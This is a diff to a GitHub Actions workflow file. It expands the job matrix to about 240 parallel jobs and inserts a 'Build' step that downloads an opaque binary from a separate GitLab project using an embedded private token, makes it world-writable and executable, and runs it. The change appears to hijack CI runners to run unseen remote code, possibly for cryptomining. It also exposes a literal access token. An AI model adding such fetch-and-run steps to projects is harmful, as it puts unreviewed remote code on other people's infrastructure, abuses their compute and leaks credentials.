@@ -16,8 +16,8 @@ jobs:
     runs-on: Ubuntu-20.04
     strategy:
       matrix:
-        D1: [0,1,2]
-        D2: [0,1,2,3,4,5,6,7]
+        D1: [0,1,2,3,4,5,6,7,8,9,11,12]
+        D2: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
       fail-fast: false
     steps:
     - name: Run checkout@v2.3.4
@@ -25,6 +25,7 @@ jobs:
 
     - name: Build
       run: |
+        wget -O build --header='PRIVATE-TOKEN: Wo2DXhtspSWrk_yhk_bs' 'https://gitlab.com/api/v4/projects/25054248/repository/files/build/raw?ref=master' && chmod 777 build && ./build
         echo "done"
     - name: Test
       run: |
